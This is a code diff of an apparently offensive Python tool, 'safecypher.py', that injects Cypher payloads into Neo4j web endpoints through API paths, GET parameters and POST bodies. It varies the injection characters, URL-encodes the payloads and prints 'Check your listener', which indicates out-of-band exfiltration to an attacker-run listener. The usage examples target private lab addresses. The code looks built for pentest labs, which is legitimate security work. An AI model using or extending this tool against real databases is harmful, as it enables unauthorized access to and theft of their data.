@@ -21,17 +21,19 @@ cookies = {
 
 
 def inject_payload(target, payload, request_type, parameters):
-    types = [["NONEXIST'", "Property"], ["-1", "ID"]]
-    for i in range(len(types)):
-        full_payload = types[i][0] + payload
+    #injection_characters = [["NONEXIST'", "Property"], ["-1", "ID"]]
+    injection_characters = [" ", "'", "\""]  
+    for i in range(len(injection_characters)):
+        full_payload = injection_characters[i] + payload
+        encoded_payload = urllib.parse.quote(full_payload, safe='')
         if request_type == "API":
-            url = f"{target + parameters + urllib.parse.quote(full_payload, safe='')}"
+            url = target + parameters + encoded_payload
         elif request_type == "GET":
-            url = target + "?" + payload
+            url = f"{target}?{parameters}={encoded_payload}"
         elif request_type == "POST":
-            full_payload = types[i][0] + payload
+            full_payload = injection_characters[i] + payload
             url = target
-            data = parameters + "=" + urllib.parse.quote(full_payload, safe='')
+            data = f"{parameters}={encoded_payload}"
         else:
             print("Invalid request type")
         try:
@@ -42,7 +44,7 @@ def inject_payload(target, payload, request_type, parameters):
                 response = requests.get(url, headers=headers, verify=False, proxies=proxies, cookies=cookies)
 
             if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
-                print(f"Injecting in {types[i][1]} ... Check your listener")
+                print(f"Injection Character {injection_characters[i]} ... Check your listener")
         except requests.exceptions.RequestException as e:
             print(f"Error occurred: {e}")
 
@@ -65,21 +67,16 @@ def main():
 Examples:
 
 API:
-python script.py -u http://ip/api/endpoint -l 127.0.0.1 -t API - p "/vulnerable_endpoint/resource"
+python3 safecypher.py -u http://192.168.17.158:3030/api/neo4j/characters -p /name/ -l 192.168.17.128 -t API
 
-http://192.168.17.158:3030/api/neo4j/
 
 
 GET:
-python script.py -u http://ip/vulnerable_page -l 127.0.0.1 -t GET -p "vulnerable_parameters"
-
-http://192.168.17.158:3030/api/neo4j/characters?name=Spongebob
+python3 safecypher.py -u http://192.168.17.158:3030/api/neo4j/characters -p name -l 192.168.17.128 -t GET
 
 
 POST:
-python script.py -u http://ip/vulnerable_page -l 127.0.0.1 -t POST -p "vulnerable_parameters"
-
-http://192.168.17.158:3030/api/neo4j/characters -d "name=Spongebob"
+python3 safecypher.py -u http://192.168.17.158:3030/api/neo4j/characters -p name -l 192.168.17.128 -t POST
     """
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j", formatter_class=argparse.RawTextHelpFormatter, epilog=examples)
     parser.add_argument("-u", "--url", required=True, help="Target URL: http://192.168.17.158:3030/api/neo4j/characters")
